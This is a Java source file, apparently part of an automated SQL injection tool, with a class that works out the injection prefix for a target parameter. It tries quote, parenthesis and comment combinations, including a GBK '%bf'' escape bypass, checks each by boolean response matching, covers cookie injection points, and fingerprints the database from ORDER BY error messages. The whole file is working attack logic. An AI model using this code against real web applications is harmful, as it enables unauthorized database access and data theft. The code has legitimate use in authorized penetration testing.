27  /**
28   * Runnable class, define insertionCharacter to be used during injection,
29   * i.e -1 in "...php?id=-1 union select...", sometimes it's -1, 0', 0, etc.
30   * Find working insertion char when error message occurs in source.
31   * Force to 1 if no insertion char works and empty value from user,
32   * Force to user's value if no insertion char works,
33   * Force to insertion char otherwise.
34   */
35  public class SuspendableGetCharInsertion extends AbstractSuspendable {
36      
37      private static final Logger LOGGER = LogManager.getRootLogger();
38  
39      public SuspendableGetCharInsertion(InjectionModel injectionModel) {
40          super(injectionModel);
41      }
42  
43      @Override
44      public String run(Input input) throws JSqlException {
45          String characterInsertionByUser = input.payload();
46          
47          ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().threadUtil().getExecutor("CallableGetInsertionCharacter");
48          CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
49  
50          var characterInsertionFoundOrByUser = new String[1];
51          characterInsertionFoundOrByUser[0] = characterInsertionByUser;  // either raw char or cookie char, with star
52          List<String> charactersInsertion = this.initCallables(taskCompletionService, characterInsertionFoundOrByUser);
53          
54          var mediatorEngine = this.injectionModel.getMediatorEngine();
55          LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "[Step 3] Fingerprinting database and prefix using ORDER BY...");
56  
57          String charFromOrderBy = null;
58          
59          int total = charactersInsertion.size();
60          while (0 < total) {
61              if (this.isSuspended()) {
62                  throw new StoppedByUserSlidingException();
63              }
64              try {
65                  CallablePageSource currentCallable = taskCompletionService.take().get();
66                  total--;
67                  String pageSource = currentCallable.getContent();
68                  
69                  List<Engine> enginesOrderByMatches = this.getEnginesOrderByMatch(mediatorEngine, pageSource);
70                  if (!enginesOrderByMatches.isEmpty()) {
71                      if (this.injectionModel.getMediatorEngine().getEngineByUser() == this.injectionModel.getMediatorEngine().getAuto()) {
72                          this.setEngine(mediatorEngine, enginesOrderByMatches);
73                          this.injectionModel.sendToViews(new Seal.ActivateEngine(mediatorEngine.getEngine()));
74                      }
75                      
76                      charFromOrderBy = currentCallable.getCharacterInsertion();
77                      LOGGER.log(
78                          LogLevelUtil.CONSOLE_SUCCESS,
79                          "Found prefix [{}] using ORDER BY and compatible with Error strategy",
80                          SuspendableGetCharInsertion.format(charFromOrderBy)
81                      );
82                      break;
83                  }
84              } catch (InterruptedException e) {
85                  LOGGER.log(LogLevelUtil.IGNORE, e, e);
86                  Thread.currentThread().interrupt();
87              } catch (ExecutionException e) {
88                  LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
89              }
90          }
91          this.injectionModel.getMediatorUtils().threadUtil().shutdown(taskExecutor);
92          if (charFromOrderBy == null && characterInsertionFoundOrByUser[0] != null) {
93              charFromOrderBy = characterInsertionFoundOrByUser[0];
94          }
95          return this.getCharacterInsertion(characterInsertionByUser, charFromOrderBy);
96      }

98      private void setEngine(MediatorEngine mediatorEngine, List<Engine> enginesOrderByMatches) {
99          if (
100             enginesOrderByMatches.size() == 1
101             && enginesOrderByMatches.getFirst() != mediatorEngine.getEngine()
102         ) {
103             mediatorEngine.setEngine(enginesOrderByMatches.getFirst());
104         } else if (enginesOrderByMatches.size() > 1) {
105             if (enginesOrderByMatches.contains(mediatorEngine.getPostgres())) {
106                 mediatorEngine.setEngine(mediatorEngine.getPostgres());
107             } else if (enginesOrderByMatches.contains(mediatorEngine.getMysql())) {
108                 mediatorEngine.setEngine(mediatorEngine.getMysql());
109             } else {
110                 mediatorEngine.setEngine(enginesOrderByMatches.getFirst());
111             }
112         }
113     }

115     private List<Engine> getEnginesOrderByMatch(MediatorEngine mediatorEngine, String pageSource) {
116         return mediatorEngine.getEnginesForFingerprint()
117             .stream()
118             .filter(engine -> engine != mediatorEngine.getAuto())
119             .filter(engine -> StringUtils.isNotEmpty(
120                 engine.instance().getModelYaml().getStrategy().getConfiguration().getFingerprint().getOrderByErrorMessage()
121             ))
122             .filter(engine -> {
123                 Optional<String> optionalOrderByErrorMatch = Stream.of(
124                     engine.instance().getModelYaml().getStrategy().getConfiguration().getFingerprint().getOrderByErrorMessage()
125                     .split("[\\r\\n]+")
126                 )
127                 .filter(errorMessage ->
128                     Pattern
129                     .compile(".*" + errorMessage + ".*", Pattern.DOTALL)
130                     .matcher(pageSource)
131                     .matches()
132                 )
133                 .findAny();
134                 if (optionalOrderByErrorMatch.isPresent()) {
135                     LOGGER.log(
136                         LogLevelUtil.CONSOLE_SUCCESS,
137                         "Found [{}] using ORDER BY",
138                         engine
139                     );
140                 }
141                 return optionalOrderByErrorMatch.isPresent();
142             })
143             .toList();
144     }

146     private List<String> initCallables(CompletionService<CallablePageSource> taskCompletionService, String[] characterInsertionFoundOrByUser) throws JSqlException {
147         List<String> prefixValues = Arrays.asList(
148             RandomStringUtils.secure().next(10, "012"),  // trigger probable failure
149             StringUtils.EMPTY,  // trigger matching, compatible with backtick
150             "1"  // trigger eventual success
151         );
152         List<String> prefixQuotes = Arrays.asList(
153             "'",
154             StringUtils.EMPTY,
155             "`",
156             "\"",
157             "%bf'"  // GBK slash encoding use case
158         );
159         List<String> prefixParentheses = Arrays.asList(
160             StringUtils.EMPTY +"%20",  // %20 required, + or space not working in path
161             ")",
162             "))"
163         );
164         List<String> charactersInsertion = new ArrayList<>();
165         LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "[Step 2] Fingerprinting prefix using boolean match...");
166         boolean isFound = false;
167         for (String prefixValue: prefixValues) {
168             for (String prefixQuote: prefixQuotes) {
169                 for (String prefixParenthesis: prefixParentheses) {
170                     if (!isFound) {  // stop checking when found
171                         isFound = this.checkInsertionChar(
172                             characterInsertionFoundOrByUser,
173                             charactersInsertion,
174                             prefixValue + prefixQuote + prefixParenthesis
175                         );
176                     }
177                 }
178             }
179         }
180         for (String characterInsertion: charactersInsertion) {
181             taskCompletionService.submit(
182                 new CallablePageSource(
183                     characterInsertion.replace(
184                         InjectionModel.STAR,
185                         StringUtils.SPACE  // covered by cleaning
186                         + this.injectionModel.getMediatorEngine().getEngine().instance().sqlOrderBy()
187                     ),
188                     characterInsertion,
189                     this.injectionModel,
190                     "prefix#orderby"
191                 )
192             );
193         }
194         return charactersInsertion;
195     }

197     private boolean checkInsertionChar(
198         String[] characterInsertionFoundOrByUser,
199         List<String> charactersInsertion,
200         String prefixParenthesis
201     ) throws StoppedByUserSlidingException {  // requires prefix by user for cookie, else empty and failing
202         var isCookie = this.injectionModel.getMediatorMethod().getHeader() == this.injectionModel.getMediatorUtils().connectionUtil().getMethodInjection()
203             && this.injectionModel.getMediatorUtils().parameterUtil().getListHeader()
204             .stream()
205             .anyMatch(entry ->
206                 CookiesUtil.COOKIE.equalsIgnoreCase(entry.getKey())
207                 && entry.getValue().contains(InjectionModel.STAR)
208             );
209         if (isCookie) {
210             charactersInsertion.add(
211                 prefixParenthesis
212                 + InjectionModel.STAR
213                 + this.injectionModel.getMediatorEngine().getEngine().instance().endingComment()
214             );
215         } else {
216             charactersInsertion.add(characterInsertionFoundOrByUser[0].replace(
217                 InjectionModel.STAR,
218                 prefixParenthesis
219                 + InjectionModel.STAR
220                 + this.injectionModel.getMediatorEngine().getEngine().instance().endingComment()
221             ));
222         }
223 
224         InjectionCharInsertion injectionCharInsertion;
225         if (isCookie) {
226             injectionCharInsertion = new InjectionCharInsertion(
227                 this.injectionModel,
228                 characterInsertionFoundOrByUser[0].replace(InjectionModel.STAR, prefixParenthesis),
229                 characterInsertionFoundOrByUser[0].replace(InjectionModel.STAR, prefixParenthesis + InjectionModel.STAR)
230             );
231         } else {
232             injectionCharInsertion = new InjectionCharInsertion(
233                 this.injectionModel,
234                 prefixParenthesis,
235                 prefixParenthesis + InjectionModel.STAR
236                 + this.injectionModel.getMediatorEngine().getEngine().instance().endingComment()
237             );
238         }
239 
240         if (this.isSuspended()) {
241             throw new StoppedByUserSlidingException();
242         }
243         if (injectionCharInsertion.isInjectable()) {
244             if (isCookie) {
245                 characterInsertionFoundOrByUser[0] = characterInsertionFoundOrByUser[0].replace(
246                     InjectionModel.STAR,
247                     prefixParenthesis + InjectionModel.STAR
248                     + this.injectionModel.getMediatorEngine().getEngine().instance().endingComment()
249                 );
250             } else {
251             characterInsertionFoundOrByUser[0] = prefixParenthesis
252                 + InjectionModel.STAR
253                 + this.injectionModel.getMediatorEngine().getEngine().instance().endingComment();
254             }
255 
256             LOGGER.log(
257                 LogLevelUtil.CONSOLE_SUCCESS,
258                 "Found [{}] using boolean match",
259                 () -> SuspendableGetCharInsertion.format(characterInsertionFoundOrByUser[0])
260             );
261             return true;
262         }
263         return false;
264     }

266     private String getCharacterInsertion(String characterInsertionByUser, String characterInsertionDetected) {
267         String characterInsertionDetectedFixed = characterInsertionDetected;
268         if (characterInsertionDetectedFixed == null) {
269             characterInsertionDetectedFixed = characterInsertionByUser;
270             String logCharacterInsertion = characterInsertionDetectedFixed;
271             LOGGER.log(
272                 LogLevelUtil.CONSOLE_ERROR,
273                 "No prefix found, forcing to [{}]",
274                 () -> SuspendableGetCharInsertion.format(logCharacterInsertion)
275             );
276         } else if (
277             !SuspendableGetCharInsertion.format(characterInsertionByUser).isBlank()
278             && !SuspendableGetCharInsertion.format(characterInsertionByUser).equals(
279                 SuspendableGetCharInsertion.format(characterInsertionDetectedFixed)
280             )
281         ) {
282             String finalCharacterInsertionDetectedFixed = characterInsertionDetectedFixed;
283             LOGGER.log(
284                 LogLevelUtil.CONSOLE_INFORM,
285                 "Found prefix [{}], disable auto search in Preferences to force [{}]",
286                 () -> SuspendableGetCharInsertion.format(finalCharacterInsertionDetectedFixed),
287                 () -> SuspendableGetCharInsertion.format(characterInsertionByUser)
288             );
289         } else {
290             LOGGER.log(
291                 LogLevelUtil.CONSOLE_INFORM,
292                 "{} [{}]",
293                 () -> I18nUtil.valueByKey("LOG_USING_INSERTION_CHARACTER"),
294                 () -> SuspendableGetCharInsertion.format(characterInsertionDetected)
295             );
296         }
297         return characterInsertionDetectedFixed;
298     }

300     public static String format(String prefix) {  // trim space prefix in cookie
301         return prefix.trim().replaceAll("(%20)?"+ Pattern.quote(InjectionModel.STAR) +".*", StringUtils.EMPTY);
302     }
